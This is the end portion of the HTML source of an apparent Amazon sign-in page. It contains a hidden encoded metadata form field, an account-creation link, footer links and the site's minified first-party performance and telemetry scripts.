    <input name="metadata1" type="hidden" value="ECdITeCs:RkMwzZx7uI0kK6vmQaJNZlwgQWGwQlsTcdk6bnvbfedlPkt+a0nn8OWnJTJxAZ7uFI4Bsod2P9wgXFJ3IXR9yK/1AEqV9uE3KundQukp1f6Lr/8Vfa0oA1UWETd0if/oW29IwqbjUpYHoZvtxgWaY8ZtcN6PXgTxVt1rltZEh2307GrjMy3SDG3KTIRZOp7jMDHR47CBQ7trbu3EllbZBx3jxO3XQrbUZLoES9VPeySArc1PWGe8QLq5wKNR+vsUZafUGgtd2mqPOO4KtNbf1Yba/gbNORkVvxmN5ncGC5S2XqibCeX2Gary178WOjdEDSIsDpfFiIiCQ2th1N3Xmm7YhI7Lb3mlZMtRw0B0Rm2fVnSIOVRYoMLsVQtkNI0fWz8lQLP6RxUSCMm777KS9s3avA5wpJ0UV0Q936/eOCHz+hZKDBi7332E7O69eZy6Xj79u4i6HslZrPQ0I6ldsSwGgzBnTlOLDf7nhYYBlkYhxbtU4LbxF9RKMlUMb/EVlLGmcHk1gbpJXnRsWouLFhIG/1tO/2WFCOXH03YxdewlWLb0dD5UQgsk/m2tDe7XokI3t7KRibM+zR3E+V9XsJc7pjmDaZnC9lhlcDH/8ZR+XWh76KpUpG9qPo7ILdjo/9iqhc6KesZ0y6fz7UEKJ7v7xhKY7MVe1Zfe0hYdoTMrIPHz3Q6zrSpnjXoHrOPqyNv5z3YuumAvixwXsH0hKl0N36dSKCceHoeZ42vmNOHRMRCubNzq567kc/C7VsuodufvdOIjCSpFoD1Nn1NhTyaTJU34CN4zpEpjDF5NwzXMvjWKiXj+nhx43PC/UIHgmUkbU/RbnWQAyYYiWNehgDHNIrfwAobK7UVpKBgEzTljeASnWgL8ukuiO+k1Gbc0XdSDrPCp+mZ9B3dRfDyTpm92rqWjY5raRuqwDfDUIz0xaMP28aIAbvxOANoygnjztsPtHyPtErcFzgHjkxzG/7C8T9F6CAjSTbg9Qq0WjEb/k15Plx+59bILskVH9xb8kJiO0BbBrRau5l5hgXxeIYUfOXSxPDDtPEWaMB7Krbwj9vuYh6QBUhzL5EOsALn9Y0uz6oAlVEmm9Vf+Y05v08jTPv5cZrA3Eha9H7xEYWh44bZafpOk2Xwxs+l38TI1wKba3HS9fqpk3YHaqZ+PGyhnHDq1JhLV9hQZirT+KR9g/ivBsrL0iguTZzb0TneEpXiS8WsUfWDIgnyDN74C8Yh9RbDJ8cuvAuLsTFiSoV4vuIHBfGg+rHmcWdFK6LD7hJiikM49ZLQnlzWnO0Pqh+XrMhAwZYlQ/Stt+d7fl+/YBj2OroOIjMnCqaUi1MH+S+8AVK+LJTyvoqInwVlolcOgoAsqCkmhVuqi0ZQJEpvL+dzE3WfLykDit1a6eQ1FfsOAbzqmuM7/rm9ZMMa0sdI9/w29kCe4YhP9IhZ2ji2cpp86E800UkViHvBrv5IGoRe35XbVXMkVVscdO9pSy09JV606EsofoT6//KdM8MDyKAYqhawoLCFVw99u/6wOKxP4NI8OPrikjm+CpSThTk+yiRmOk22I03S9c3cjKPmBL/I7GlfAw6TAdYE0AaDCkRZKbIxrba60nIefGYj7BeeR7hq62m8mqr5PD/jc2XNbqYZftwGqvZPi3p+/aPouY+H4J16gQbnr3K8OTaHD3Eg+1u5AibEXTLlrXWAjrxEHKMqw/8XfuOUgey/uQjGwp3vCZZae7u2dr9n+h+FcVc5zYri7yRAKb+k7G9AfzZZcxL8W4hwP1+GBIgwOFDBgjF3e+Ebn7b+4KahMDb05t1pb7n7vLVC2h4u3T7MSmIyte1c6uFxF5gwABsJ8PaY9NfGuRMYDgkaRFTJip1hFIDm+MU6RLOCeblAn44wglJPhaccplKHsjEHUTlmO5Ali+f2ligsRTE1z4E7GikbuaGqin3A4ezHtOp2sgFOVa688kVqoy1ttSpFYr5Ly7aYiMz5J1PsnQq7cQWwipnep8h/4coqVTwVobCNRb2PlUG7d6Zfd2m/qwJSvIEgwob9XYU7uqEjmPOvNrNUMa0NK1NUaX/Y4ycO/cClolfQW/nRNlFfGb8BHdW9EBIdjqG1Hu/CZkmDPQbJG4NaBQMmSGC34cRKoUzVkIJN37cWZsrBDp1ITVQxVz5xYxzt+b2dtzfZdXB4AbQXTzICHYyOQAvQX71nZ8HSK8lZB8y50FxJYoOE+Bg8k1vYdxVjyf6tiv8J2Fo2ygSB1oq/R7fcDgi3YQBLLQApWq59SQu0ZCzYLP5tnAxChS8z65xb1zF5FrKEy4Mz7KUnIiKbBUbByTzt2rz5oJbizQJA+9WTCPPS8eMfIWd7kY7cD37rQdR2zErGq5whHNY+IXH8VV4qja2rzisOrG71JFnm1MBkd10CdHlBi+8zztaqFp81o7stlEynp8w1yedMqCXY11qb3FPrIeaE6kTG1/AOv+dKAlb3tN84TJV70jZH0Gw/2c0ceAjVyqwkf4oEblE6P69JaehvR7liKK9Qne66tYd7CMxk1OR/MtaEg8DBO6gvivBYGhfYfDDjLCkhA2kG9e2OuQc2Jnjb5+BMusU1UPFOuPwvVoJsbWm8F6Mxmub4IaAOgyzg32jJjM5493SGap0+F7380gNFELBecSKrMVCLprZmw0oe3E/byQ05siQ8u1AAnKE3DtclIJbBuNBAWlrNPriEeMREDaqhDNPt7CVpEaLepnwOOSUnJfaTKXDO9FCV7skn35nALCuZXHgQiCq3+Ryo7mWifThSVQF4mHRm44AX3QmrLh2i49goE8FF5uTfswOwHm5lWKnhn7ZMIAt7CDkDYLf5CEMB1jEZkXzdnnSLjDvfvVaC7OEKxi1EKyH4S6pNJlz50BV13bglEf6NBtXfFV8JhHCMS5y4xTNAOf1fwk+ESlo2ANIlyiO3+LHr1T73FDuskCSuCjL+/ADrOe1DAU7AXczzHVDFCHPwJjTPPAhtxrmxSt1ywvChWYGifHxEnIi90TRYrOvFkrMWL0FnR6gbJGIpanIG4bxklBSvrxppLPzz6XEap8eOiIl1XiNPbd2I+v+SagHxMl7dPXj+QWlkkJSiBF08nT9P9DhE2iiD/SUlz3pu0uHBo11TdB6YC9l4PhvZYpk0oEyHid7txr+OYJyz6YtAmRN9SgEgnTOrRrt0AnziR4lXkOPknKrkHk1U775hbZAnXD/wx9dQ07phbmbGBZy+8mzY78hFop8pbo226ea++iS0j2GPaBKfgYIg44Y5H2Tt8U8YhKUQkm9HfWCQBiWu4NKvEb4WZCcVVQzAKP/pag4lt2xWQ0hXzg7HxqdQOlblhwHcpmYaquwYMxZQ+jlivdYrJpn2gQhKYXVU+SSS5i64zyKmbmROFzb2uOCD93ACIgKqEcumiHQlrwnMcnwC91Z/+abnfrX/xQZdiI1zjGAlDKCqZu94YHNKCCBhoxGWM0TbI7hOKGojvG+ar6epQw+972T+MnIiOL+6OW2JpPhk9F702QlgSqZQuVecxfJj80LWCb7pfPi0g2c9CfVimatfIod/LR3Z1ibdJ2fuluQ7+XZDhfrMG8i9Vvuj/RK+fDuH6TyovPDqP1ohpxrGer33IvUkGf3APhax8xnQhB1CFfho2BzcsbMLlSMDSQiDT8GJ9VVrI44ONlmn+8kIDlWryOugW2kXZTm44TeH8eZEd+vL4jaJO8p+V0mijeV0DJZmTcAL9H9ZJUCr4zXzvwU2QApjmiuROzuyoDFp2nfh5VcigULRXXAlYQ7xQBv8qCA+cvUdRMMrDRetPZ+t4+SwjAswyZsiMVeP2JQ4XbhS+vbe9b2V6/VQ7yl9yf9bB6TQhdIoiea+t08JZCDaUhUre/3P+Z/MgaZ/+VA5Kgn4wFmHGZ7whQ3cIPiTC+M5p9utzoJwbCIWFW0BP6RxOxBGEYloZNgZrPWMrR5XhQ6DrLI3FvRXoVYG/GCDxGJHYK0t/hzdzzpd/RYoe2jQ7MayTzNxKIYdBPbxaTZPz4FJwpbjL81CeJMYA10wBqeqyyETtMlwk5gfXqMOwR9FANJVy1rwTo9SxDrbhkhHMzmmQQx5YscxK8QtTopWVFnXtEEXennnUn+houQW2txS6Wsll+DQ77AfpjLX3YOo+UxIFpdbUDgQ4sTET3rEYiU49viTIq2Oxp5JhfCHFilYDo4DEvvrLT0/wrCcgeBBGyPdq78u/vKz9E0HYdKRXc3vLLzPzaBtXmKitd/V1mb4nG70+FzLLEEsy6uj9ZTfVU6p1tlkP+RLXfzX74r4nJVsT2Dg2zxVznepc7NjHr8e0Cx5MyYl4dNVTVbh/bMy5VyyNywkZLc0v2nNfrYIFsc6kFct4QNLlqGgYXL6tY9bxllzX6E9qobBo/DcW9QOtZThT1o7bMxvFW9flYaNQz+V4Bs27TS/UdUDJL5sdSuypZBZAJvHBv2dnxkIrXC34C+f9GiF7bmnH9AqG+ean1n0uwZZg2XkXcTBqrn68RAv1bKXCEV9LNnzl6TEOb6fXWzeGKDFf1sah0yXPuWM8vb2/QIKx+euK+WrZjqSI9bYlYA+BO/Hqw7EEsn0eT7rcV8lUxVaJl1EgM2HOwrv9Dcud5a7Y0RJD2wK1C9BJRQqUm1NdkqBlLhD+Fuf7SzeOchP4xgh4zYcN+AvUsVYMuFrSzixktFbfXff26NfRSL8oHRHm0q3yabw60FaYbMjukhOyFZQgQ9IGJwSlx12lgvwY+NoHPrV99vnxRPrPS0v2yLUdnQopf3f7xLGEyw7eecQy/3Ht37SSscLOd138c8plVFVAkFiegx2bECJASo5qccwiAZ323o8OGauW24z3x86al/7Ul9Lc8cuMkWndg50t/pfEsgEnJrqLHUDLzW+ZmUbs/qvkvK/DkeXUkRoMB6e/Ca7jpvSH56TRdxC8c5sltf+inntxoLr7keZ+Cj1aiA8hisfcGLbCjhHmrN255txwOp1tH+h8Q7F9jJpiSQ+CIG5jikMqC93hqSV/BTDAjt4vmxjgcTflKuSLnPG89yB2VxV+LOtyNBhG+Mch95YZssxypHA/WvFfzdiU6uxr3K4zJFOIjVk6nq4Ck429XmpX/eFO/pxdwXMTr75ggoKbkYfutatXkQuCpflUUv690EOZE3dZIN5qdvBbvSW9b9qdg+vNg4HsCOpyQkHh2BlBRoMbizRZp7vQs3COcAhINoCldF1SaDASaTTYPMO2wW6vrsyJeHmSnhsxPiZG8IrnTt92uyL4jFRPZTpi9gvvncSxZ3jb/X3rwUQvN37qxeazQmqYSjeI96VOuLtUwANj+GS7szP3Aof9z/6QM4YwVMXwsr4nBUacQatUV9VTKRG+kxQUq51guD98cDy+7tBzxJnPiZIegw13peklrO/xPh+OKIHsaWwYa4oO/6sLKl4K4RlffFoAUtDKbECqqTZ6Z12fuTI2pEN0TmDqmsHIlYj3tQbRhi2JLrhEFI6/9SsHFAJ+USmQ6MCjv0dmcAj6l2LGWzftgj5dReGoLuy5sMKHNFiqbqv4SGbbqDWKQWAl9sGGSQSGCF8yychRIFjRIQkJ9ML8UJoA+Xpzd1q52nSYeLTqk4tR20hAiCwIhpRfy3EqgvXJJqhfJfJNgjebvsnYercZ1LmcueVzDGcT7KPE9NUYYM43DKKkCNVKC7DqgYcoAO1/gwM5EDCf045Mg/PFcu41a9VE348fX9Qs6DcErU3VRcurZY3YeWgraeO1VNLL0I+ipYxNvryco0gRdw31cqDWRdcEvUQdGyN8cOPvtf2UYmI6IkBMTKnvwuEVcbMA7nIQftCg6E7j8EMFZhxPbzD4A6F7vjzIQaiWVv7jzphYJK6uxmqIgvsAX8q3xyqK3ldczT3cePSf/7qv2wRtSj9yHFRPcdllnOl8C4tLVxTMHNMPwpZxVSOZGIe09o9aDjRTfO8DXR81AXrwaRIerIwvcAnVKQssG7ReP5cTAF2vTWLvQVQlOLsJe6cGvv0J0tYNOF+/ZDLEs1krqQ2FK49nNiU6vbLuQXfzyyfyjo3FHqzRRSCoVmpsw9c0Cf9nKKeWOYsgQbFHdFT5n/441GwZUB/cUDxXR21sSSJW7sWpg8IEWhSE2rijNOfqn67rQN6oXIWrRiWpubJwyg77e1V0BsihoL1wsCIOGYy8ItlD95szzkHaC0jJ6rXfn4OItkTdAcLegI8iIKGDp9fc/7i70ic+tx/C7fVc+Zs69eLh2g/vNGVevcY3rFhEJBYzhtAA4ruDaWmthb7G4AD+ttmrrIVJ/oQtM+Q4jn5DRdpR2vmmufS0ZEV/sWkCQq037fV5ekH8cDdhGvG0jTzukyWZ9EvuliZ9JzbbxyaSeYScQ076QZWyYE5S6EIWlDjV4Ej37+zrNEvMIrfvIO7LbJZmlVkq4B4RUjYgjlJuIREuUbI089kbG4ZFmvaGn3l/SUBAM9g4BNGd2n/YWQjf2rT1MMfQNwhjW4miSB4opt59GiowD5xmi91hQI+zCTDuDy/KwbbWocfWRcD/Kr5z+4KY2jvT5EDY1Qmi3INAmEfiG0kc81wCl98g87kPxQP8RLGllw8EUgA0qqTBnQk0MYRWyKkl14HwFksS+FyfjL6nfjOzUFNygJFQ5j/juRbsn7mIj7f+pKV//zO58XYznP+zLnUGNPctVWSNyYOIIl11gIfKUsyEfmSiBS5Lu19ntJsjGybnLgnXF0vY/psjF3v80E6QkL9wnLsFDUJav+vyMp1Pm28s2vVmBv7aeT9R+PsmQUWWatx7znLIZrB/x9ZPs++f+j2TMZpVwEiImCF5Rci4QRCsCAWfcgiAmlh7JH4vIcRTSSykFuBQhXgSgPRJDAWMFdy9gz0t2dliRBwd145k0cyfDgAsogRoN0PgFXmYznGBrScX62qYq3qvK+5lNkw/L54/AVaNe1w5pGS24v4q8UO/ij5pL0OHZqMHCnQyEG1vggP2dqyxYUyxiXStYilDde1fnTwNWyZSNSO1pJCsDthfA5o0pbHuJxt4aeaSC5i9ps9an1aWprIb/geSftCSGskmaZ+DfubQ0e0tUf3khqxBq68NcUCfkPY+zzd6cn36jATzDTMH82GlHuZDznLATFlD0SdzJyr6MeFdTIl5egb4dkI/rISZ6/BYmtdvECxSWCbbNtH72+5hSA5/yBiN7FsF1iKVPKfamKoly0D5owgBkz17rAmrUs034Cd7z/xyVpmw4FB+PEQWJmE5c61POMfun/DaCE0XHrpE4cLy/X852laSqi23xNvigMFvTGKGvGmq8X8s0ZQ8irO2ylTxYw0x6flhbzqt2H6ymXDttQ8TunHwCs6GjXEfT3LYLu/VO+9bevW2naBloAWLOxUTfYmty8RGxc6rixChdOqkSk7B+fp7+P9wswildqDeUg1O6AK2F8ovt1ajudwczPQz/U1tRyQYKfIqFMFtaV8DN2jaA/reAw2YZL97hiR2TV8Pn5ReIp/oct3B9MNy0NpGVS8uzpf1SuQvJQIyQNlvzDM/fAs9uCkqyae0NNw1NkwN4W7ytF3OHFPmFK3Uz6l5LLqXXSszt3VZfwZuD7h7+iUcVtmBTlFaWCbps+vK5Blx87DSAH/KEuVVEI9EOLn/8RdS4ioxxaTu8oJeunV9qJhiS7h/MTaL0kXvoijvGjAOenb10kg3+jpheuZMe28rRQmlu/ry1AlX2K4cJOtZSYHOUjBW1aSyC+V9fxGW233qjtx+Dd5WWBzKxt9WZI6vBcKLRVuvhJuTv/28++gKfEHGBpWq5OY/aWEjBUslGfzfiaDxnGxvzI0GMXUMQQxWXanBRPZB76VHmtpbQpAgjyqcZXWqDlzgW70Te0TndrWm+L8o4ANrPNzvltqpFgH3V6OjmctO099NhtBPY/9+t4Oc2+tMqtDwMXYGnMa3DbhZSppeMTIlOYPwHbQAGL01KL5tEQEN8wmM75R2KGro1bUT4r1zy51+Et2d+C0Q8bgKecrBbNKIaj+wsS9cn22LpoZS"></form>
  </div>
  
    
    
      
        
        <div class="a-divider a-divider-break"><h5>New to Amazon?</h5></div>
        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="https://www.amazon.com/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%3Fie%3DUTF8%26%252AVersion%252A%3D1%26%252Aentries%252A%3D0&amp;prevRID=M49R8JGG5Z1BWJV74PY6&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text" role="button">
          Create your Amazon account
        </a></span></span>
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
      Conditions of Use
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
      Privacy Notice
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="/help">
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-2020, Amazon.com, Inc. or its affiliates
</span>

</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    

<script type="text/javascript">
  try {
    var metadataList = document.getElementsByName('metadata1');
    if (metadataList.length == 0) {
      var input = document.createElement('input');
      input.name = 'metadata1';
      input.type = 'hidden';
      input.value = 'true';

      var authenticationFormList = document.getElementsByName('signIn');
      for (var index = 0; index < authenticationFormList.length; index++) {
        authenticationFormList[index].appendChild(input);
      }
    } else {
      for (var index = 0; index < metadataList.length; index++) {
        metadataList[index].value = 'true';
      }
    }
  } catch (e) {
    if (typeof window.ueLogError === 'function') {
      window.ueLogError(e, {
        message: 'Failed to populate default metadata value',
        logLevel: 'warn',
        attribution: 'FWCIMAssets'
      });
    }
  }
</script>
<script type="text/javascript">
    window.fwcimCmd = [
        
            ['profile', 'signIn']
            
        
    ];
</script>

    
    <!-- cache slot rendered -->
    
  </div><div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="get"><input type="hidden" name="ue_back" value="2"></form>


<script type="text/javascript">
window.ue_ibe = (window.ue_ibe || 0) + 1;
if (window.ue_ibe === 1) {

(function(e,c){function h(b,a){f.push([b,a])}function g(b,a){if(b){var c=e.head||e.getElementsByTagName("head")[0]||e.documentElement,d=e.createElement("script");d.async="async";d.src=b;d.setAttribute("crossorigin","anonymous");a&&a.onerror&&(d.onerror=a.onerror);a&&a.onload&&(d.onload=a.onload);c.insertBefore(d,c.firstChild)}}function k(){ue.uels=g;for(var b=0;b<f.length;b++){var a=f[b];g(a[0],a[1])}ue.deffered=1}var f=[];c.ue&&(ue.uels=h,c.ue.attach&&c.ue.attach("load",k))})(document,window);


if (window.ue && window.ue.uels) {
            ue.uels("https://images-na.ssl-images-amazon.com/images/I/31BVuidgT8L.js");
}
var ue_mbl=ue_csm.ue.exec(function(e,a){function l(f){b=f||{};a.AMZNPerformance=b;b.transition=b.transition||{};b.timing=b.timing||{};e.ue.exec(m,"csm-android-check")()&&b.tags instanceof Array&&(f=-1!=b.tags.indexOf("usesAppStartTime")||b.transition.type?!b.transition.type&&-1<b.tags.indexOf("usesAppStartTime")?"warm-start":void 0:"view-transition",f&&(b.transition.type=f));"reload"===c._nt&&e.ue_orct||"intrapage-transition"===c._nt?a.performance&&performance.timing&&performance.timing.navigationStart?
b.timing.transitionStart=a.performance.timing.navigationStart:delete b.timing.transitionStart:"undefined"===typeof c._nt&&a.performance&&performance.timing&&performance.timing.navigationStart&&a.history&&"function"===typeof a.History&&"object"===typeof a.history&&history.length&&1!=history.length&&(b.timing.transitionStart=a.performance.timing.navigationStart);f=b.transition;var d;d=c._nt?c._nt:void 0;f.subType=d;a.ue&&a.ue.tag&&a.ue.tag("has-AMZNPerformance");c.isl&&a.uex&&uex("at","csm-timing");
n()}function p(b){a.ue&&a.ue.count&&a.ue.count("csm-cordova-plugin-failed",1)}function m(){return a.webclient&&"function"===typeof a.webclient.getRealClickTime?a.cordova&&a.cordova.platformId&&"ios"==a.cordova.platformId?!1:!0:!1}function n(){try{P.register("AMZNPerformance",function(){return b})}catch(a){}}function h(){if(!b)return"";ue_mbl.cnt=null;for(var a=b.timing,d=b.transition,a=["mts",k(a.transitionStart),"mps",k(a.processStart),"mtt",d.type,"mtst",d.subType,"mtlt",d.launchType],d="",c=0;c<
a.length;c+=2){var e=a[c],g=a[c+1];"undefined"!==typeof g&&(d+="&"+e+"="+g)}return d}function k(a){if("undefined"!==typeof a&&"undefined"!==typeof g)return a-g}function q(a,c){b&&(g=c,b.timing.transitionStart=a,b.transition.type="view-transition",b.transition.subType="ajax-transition",b.transition.launchType="normal",ue_mbl.cnt=h)}var c=e.ue||{},g=e.ue_t0,b;if(a.P&&a.P.when&&a.P.register)return a.P.when("CSMPlugin").execute(function(a){a.buildAMZNPerformance&&a.buildAMZNPerformance({successCallback:l,
failCallback:p})}),{cnt:h,ajax:q}},"mobile-timing")(ue_csm,window);

(function(d){d._uess=function(){var a="";screen&&screen.width&&screen.height&&(a+="&sw="+screen.width+"&sh="+screen.height);var b=function(a){var b=document.documentElement["client"+a];return"CSS1Compat"===document.compatMode&&b||document.body["client"+a]||b},c=b("Width"),b=b("Height");c&&b&&(a+="&vw="+c+"&vh="+b);return a}})(ue_csm);

(function(a){var b=document.ue_backdetect;b&&b.ue_back&&a.ue&&(a.ue.bfini=b.ue_back.value);a.uet&&a.uet("be");a.onLdEnd&&(window.addEventListener?window.addEventListener("load",a.onLdEnd,!1):window.attachEvent&&window.attachEvent("onload",a.onLdEnd));a.ueh&&a.ueh(0,window,"load",a.onLd,1);a.ue&&a.ue.tag&&(a.ue_furl?(b=a.ue_furl.replace(/\./g,"-"),a.ue.tag(b)):a.ue.tag("nofls"))})(ue_csm);

(function(g,h){function d(a,d){var b={};if(!e||!f)try{var c=h.sessionStorage;c?a&&("undefined"!==typeof d?c.setItem(a,d):b.val=c.getItem(a)):f=1}catch(g){e=1}e&&(b.e=1);return b}var b=g.ue||{},a="",f,e,c,a=d("csmtid");f?a="NA":a.e?a="ET":(a=a.val,a||(a=b.oid||"NI",d("csmtid",a)),c=d(b.oid),c.e||(c.val=c.val||0,d(b.oid,c.val+1)),b.ssw=d);b.tabid=a})(ue_csm,window);
ue_csm.ue.exec(function(e,f){var a=e.ue||{},b=a._wlo,d;if(a.ssw){d=a.ssw("CSM_previousURL").val;var c=f.location,b=b?b:c&&c.href?c.href.split("#")[0]:void 0;c=(b||"")===a.ssw("CSM_previousURL").val;!c&&b&&a.ssw("CSM_previousURL",b);d=c?"reload":d?"intrapage-transition":"first-view"}else d="unknown";a._nt=d},"NavTypeModule")(ue_csm,window);
ue_csm.ue.exec(function(c,a){function g(a){a.run(function(e){d.tag("csm-feature-"+a.name+":"+e);d.isl&&c.uex("at")})}if(a.addEventListener)for(var d=c.ue||{},f=[{name:"touch-enabled",run:function(b){var e=function(){a.removeEventListener("touchstart",c,!0);a.removeEventListener("mousemove",d,!0)},c=function(){b("true");e()},d=function(){b("false");e()};a.addEventListener("touchstart",c,!0);a.addEventListener("mousemove",d,!0)}}],b=0;b<f.length;b++)g(f[b])},"csm-features")(ue_csm,window);


(function(b,c){var a=c.images;a&&a.length&&b.ue.count("totalImages",a.length)})(ue_csm,document);
(function(b){function c(){var d=[];a.log&&a.log.isStub&&a.log.replay(function(a){e(d,a)});a.clog&&a.clog.isStub&&a.clog.replay(function(a){e(d,a)});d.length&&(a._flhs+=1,n(d),p(d))}function g(){a.log&&a.log.isStub&&(a.onflush&&a.onflush.replay&&a.onflush.replay(function(a){a[0]()}),a.onunload&&a.onunload.replay&&a.onunload.replay(function(a){a[0]()}),c())}function e(d,b){var c=b[1],f=b[0],e={};a._lpn[c]=(a._lpn[c]||0)+1;e[c]=f;d.push(e)}function n(b){q&&(a._lpn.csm=(a._lpn.csm||0)+1,b.push({csm:{k:"chk",
f:a._flhs,l:a._lpn,s:"inln"}}))}function p(a){if(h)a=k(a),b.navigator.sendBeacon(l,a);else{a=k(a);var c=new b[f];c.open("POST",l,!0);c.setRequestHeader&&c.setRequestHeader("Content-type","text/plain");c.send(a)}}function k(a){return JSON.stringify({rid:b.ue_id,sid:b.ue_sid,mid:b.ue_mid,mkt:b.ue_mkt,sn:b.ue_sn,reqs:a})}var f="XMLHttpRequest",q=1===b.ue_ddq,a=b.ue,r=b[f]&&"withCredentials"in new b[f],h=b.navigator&&b.navigator.sendBeacon,l="//"+b.ue_furl+"/1/batch/1/OE/",m=b.ue_fci_ft||5E3;a&&(r||h)&&
(a._flhs=a._flhs||0,a._lpn=a._lpn||{},a.attach&&(a.attach("beforeunload",g),a.attach("pagehide",g)),m&&b.setTimeout(c,m),a._ffci=c)})(window);


(function(k,c){function l(a,b){return a.filter(function(a){return a.initiatorType==b})}function f(a,c){if(b.t[a]){var g=b.t[a]-b._t0,e=c.filter(function(a){return 0!==a.responseEnd&&m(a)<g}),f=l(e,"script"),h=l(e,"link"),k=l(e,"img"),n=e.map(function(a){return a.name.split("/")[2]}).filter(function(a,b,c){return a&&c.lastIndexOf(a)==b}),q=e.filter(function(a){return a.duration<p}),s=g-Math.max.apply(null,e.map(m))<r|0;"af"==a&&(b._afjs=f.length);return a+":"+[e[d],f[d],h[d],k[d],n[d],q[d],s].join("-")}}
function m(a){return a.responseEnd-(b._t0-c.timing.navigationStart)}function n(){var a=c[h]("resource"),d=f("cf",a),g=f("af",a),a=f("ld",a);delete b._rt;b._ld=b.t.ld-b._t0;b._art&&b._art();return[d,g,a].join("_")}var p=20,r=50,d="length",b=k.ue,h="getEntriesByType";b._rre=m;b._rt=c&&c.timing&&c[h]&&n})(ue_csm,window.performance);


ue_csm.ue._rtn = 1;
(function(e,f){function h(a){a=a.split("?")[0]||a;a=a.replace("http://","").replace("https://","").replace("resource://","").replace("res://","").replace("undefined://","").replace("chrome://","").replace(/\*/g,"").replace(/!/g,"").replace(/~/g,"");var b=a.split("/");a=a.substr(a.lastIndexOf("/")+1);b.splice(-1);b=b.map(function(a){c[a]||(c[a]=(k++).toString(36));return c[a]});b.push(a);return b.join("!")}function l(){return f.getEntriesByType("resource").filter(function(a){return d._rre(a)<d._ld}).sort(function(a,
b){return a.responseEnd-b.responseEnd}).splice(0,m).map(function(a){var b=[],c;for(c in a)g[c]&&a[c]&&b.push(g[c]+Math.max(a[c]|0,-1).toString(36));b.push("i"+a.initiatorType);(1==d._rtn&&d._afjs>n||2==d._rtn)&&b.push("n"+h(a.name));return b.join("_")}).join("*")}function p(){var a="pm",b;for(b in c)c.hasOwnProperty(b)&&(a+="*"+c[b]+"_"+b);return a}function q(){d.log({k:"rtiming",value:l()+"~"+p()},"csm")}if(f&&f.getEntriesByType&&Array.prototype.map&&Array.prototype.filter&&e.ue&&e.ue.log){var g=
{connectStart:"c",connectEnd:"C",domainLookupStart:"d",domainLookupEnd:"D",duration:"z",encodedBodySize:"e",decodedBodySize:"E",fetchStart:"f",redirectStart:"r",redirectEnd:"R",requestStart:"q",responseStart:"s",responseEnd:"S",startTime:"a",transferSize:"t"},d=e.ue,c={},k=1,n=20,m=200;d&&d._rre&&(d._art=function(){d._ld&&window.setTimeout(q,0)})}})(ue_csm||{},window.performance);


(function(c,d){var b=c.ue,a=d.navigator;b&&b.tag&&a&&(a=a.connection||a.mozConnection||a.webkitConnection)&&a.type&&b.tag("netInfo:"+a.type)})(ue_csm,window);


(function(c,d){function h(a,b){for(var c=[],d=0;d<a.length;d++){var e=a[d],f=b.encode(e);if(e[k]){var g=b.metaSep,e=e[k],l=b.metaPairSep,h=[],m=void 0;for(m in e)e.hasOwnProperty(m)&&h.push(m+"="+e[m]);e=h.join(l);f+=g+e}c.push(f)}return c.join(b.resourceSep)}function s(a){var b=a[k]=a[k]||{};b[t]||(b[t]=c.ue_mid);b[u]||(b[u]=c.ue_sid);b[f]||(b[f]=c.ue_id);b.csm=1;a="//"+c.ue_furl+"/1/"+a[v]+"/1/OP/"+a[w]+"/"+a[x]+"/"+h([a],y);if(n)try{n.call(d[p],a)}catch(g){c.ue.sbf=1,(new Image).src=a}else(new Image).src=
a}function q(){g&&g.isStub&&g.replay(function(a,b,c){a=a[0];b=a[k]=a[k]||{};b[f]=b[f]||c;s(a)});l.impression=s;g=null}if(!(1<c.ueinit)){var k="metadata",x="impressionType",v="foresterChannel",w="programGroup",t="marketplaceId",u="session",f="requestId",p="navigator",l=c.ue||{},n=d[p]&&d[p].sendBeacon,r=function(a,b,c,d){return{encode:d,resourceSep:a,metaSep:b,metaPairSep:c}},y=r("","?","&",function(a){return h(a.impressionData,z)}),z=r("/",":",",",function(a){return a.featureName+":"+h(a.resources,
A)}),A=r(",","@","|",function(a){return a.id}),g=l.impression;n?q():(l.attach("load",q),l.attach("beforeunload",q));try{d.P&&d.P.register&&d.P.register("impression-client",function(){})}catch(B){c.ueLogError(B,{logLevel:"WARN"})}}})(ue_csm,window);



var ue_pty = "AuthenticationPortal";

var ue_spty = "SignInClaimCollect";



var ue_adb = 4;
var ue_adb_rtla = 1;
